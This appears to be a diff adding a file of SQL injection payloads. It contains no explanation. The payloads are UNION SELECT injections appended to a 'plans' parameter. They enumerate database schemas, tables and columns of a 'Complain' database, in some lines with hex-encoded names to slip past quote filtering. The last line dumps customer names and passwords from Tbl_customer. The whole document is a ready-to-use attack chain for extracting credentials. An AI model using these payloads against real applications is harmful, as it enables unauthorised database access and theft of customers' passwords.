@@ -1,0 +1,9 @@
+plans union select 1,schema_name,3,4,5 from information_schema.schemata#
+
+plans union select 1,table_name,3,4,5 from information_schema.tables where table_schema="Complain"#
+plans union select 1,table_name,3,4,5 from information_schema.tables where table_schema=0x436f6d706c61696e#
+
+plans union select 1,column_name,3,4,5 from information_schema.columns where table_schema="Complain" and table_name="Tbl_customer"#
+plans union select 1,column_name,3,4,5 from information_schema.columns where table_schema=0x436f6d706c61696e and table_name=0x54626c5f637573746f6d6572#
+
+plans union select 1,concat(Cname,0x3a,Cpass),3,4,5 from Complain.Tbl_customer#
